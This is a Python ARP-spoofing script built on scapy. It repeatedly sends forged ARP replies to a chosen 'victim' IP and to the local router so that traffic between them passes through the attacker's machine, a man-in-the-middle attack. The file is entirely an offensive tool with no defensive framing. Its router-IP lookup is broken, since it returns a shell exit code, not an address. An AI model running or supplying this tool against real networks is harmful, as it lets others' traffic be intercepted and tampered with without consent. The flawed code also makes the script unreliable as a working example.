#!/usr/local/bin/python3

import os
import sys
import time
import argparse
import scapy.all as scapy


def get_arguments():
    # Parse the passed arguments
    parser = argparse.ArgumentParser()

    parser.add_argument("-t", "--target", dest="target", help="Target's IP address (example: 192.168.0.154)")

    arguments = parser.parse_args()

    if not arguments.target:
        parser.error("[-] Missing -t argument (--target), please use --help for more details.")

    return arguments


def get_router_ip(opsys):
    if opsys == "Linux":
        ip = os.system('ip route show | grep - i \'default via\' | awk \'{print $3 }\'')
        return ip
    else:
        ip = os.system('netstat -nr | grep default | grep -o \'[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\'')
        # ip = re.match(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", ip)
        return ip


def get_mac(ip):

    # combine two packets
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request

    # send the packet
    answered_list, unanswered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)  # packet, timeout

    # return target's MAC address
    for answer in answered_list:
        return answer[1].hwsrc


def spoof(target_ip,spoof_ip):

    # this is the packet that is set to the victim device
    target_mac  = get_mac(target_ip)
    packet      = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=spoof_ip)

    # we set "op" to 2 because it's a response packet, not a request
    # we set "pdst" to the IP of the target machine (use networkscanner.py)
    # we set "hwdst" to the MAC address of the target machine (use networkscanner.py)
    # we set "psrc" to the IP of the router (use networkscanner.py)

    print(packet.summary())
    print(packet.show())
    print(" ")

    scapy.send(packet, verbose=False)


def check_os():
    # Check the Operating System
    from sys import platform
    if platform == "linux" or platform == "linux2":
        print("[+] You are running: Linux\n")
        return "Linux"
    elif platform == "darwin":
        print("[+] You are running: OSX\n")
        return "OSX"
    elif platform == "win32":
        print("[+] You are running: Windows\n")
        return "Windows"
    else:
        print("[+] You are running: Other Operating System\n")
        return "Other"


options     = get_arguments()
os.system('clear')
opsys       = check_os()

print("[+] Your router's IP:")
router_ip   = get_router_ip(opsys)
print("[+] Your target's IP:")
victim_ip = options.target
print(victim_ip)

while True:
    # send spoof packets continuously to router and victim
    spoof(victim_ip,router_ip)
    spoof(router_ip,victim_ip)
    print("[+] Sent two spoof packets")
    time.sleep(2)